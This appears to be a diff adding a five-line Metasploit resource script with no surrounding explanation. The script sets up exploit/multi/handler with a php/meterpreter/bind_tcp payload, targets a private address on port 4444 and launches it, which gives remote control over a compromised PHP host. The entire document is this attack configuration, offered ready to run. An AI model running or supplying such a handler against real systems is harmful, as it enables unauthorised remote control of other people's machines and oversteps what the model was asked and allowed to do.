@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload php/meterpreter/bind_tcp
+set rhost 192.168.10.135
+set lport 4444
+exploit
